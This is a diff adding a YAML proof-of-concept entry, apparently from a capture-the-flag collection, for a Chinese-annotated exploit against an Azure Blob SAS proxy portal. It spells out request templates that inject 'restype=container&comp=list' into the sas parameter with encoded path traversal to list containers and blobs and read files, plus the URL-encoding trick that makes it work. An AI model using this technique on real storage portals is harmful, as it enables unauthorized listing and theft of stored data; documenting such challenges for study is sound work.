@@ -1,0 +1,34 @@
+info:
+  name: azurite_sas_portal_list_read
+  cve: ''
+  summary: Azure Blob SAS 门户：通过 sas 参数注入 restype=container&comp=list 列出容器/blob，再读取敏感文件
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: Azure Blob SAS 门户：通过 sas 参数注入 restype=container&comp=list 列出容器/blob，再读取敏感文件
+  steps:
+  - 1. GET /api/sas/generate 获取 sas_token
+  - '2. 列容器: /api/sas/<c>/%2e%2e?sas=<urlencode("restype=container&comp=list&"+sas)>'
+  - '3. 列blob: /api/sas/<c>/%2e?sas=<urlencode("restype=container&comp=list&"+sas)>'
+  - '4. 读blob: /api/sas/<c>/<blob>?sas=<urlencode(sas)>'
+  - 5. 从响应 content 字段提取 flag
+  payload: '# 门户 /api/sas/<container>/<blob> 从 query 提取 sas 参数值并 URL 解码后附加到转发 URL
+
+    # 1. 获取 sas token: GET /api/sas/generate
+
+    # 2. 列出所有容器: blob名=%2e%2e(..), sas值=restype=container&comp=list&<sas> (整体URL编码)
+
+    #    /api/sas/<container>/%2e%2e?sas=<urlencode("restype=container&comp=list&"+sas)>
+
+    # 3. 列出容器内blob: blob名=%2e(.), 同上
+
+    #    /api/sas/<container>/%2e?sas=<urlencode("restype=container&comp=list&"+sas)>
+
+    # 4. 读取blob: blob名=实际文件名, sas值=完整sas (URL编码)
+
+    #    /api/sas/<container>/<blob>?sas=<urlencode(sas)>
+
+    # 关键: sas 参数值必须整体 URL 编码(含 & 编码为 %26)，否则 & 截断导致 AuthorizationFailure'
+  verification: Azure Blob SAS 门户：通过 sas 参数注入 restype=container&comp=list 列出容器/blob，再读取敏感文件
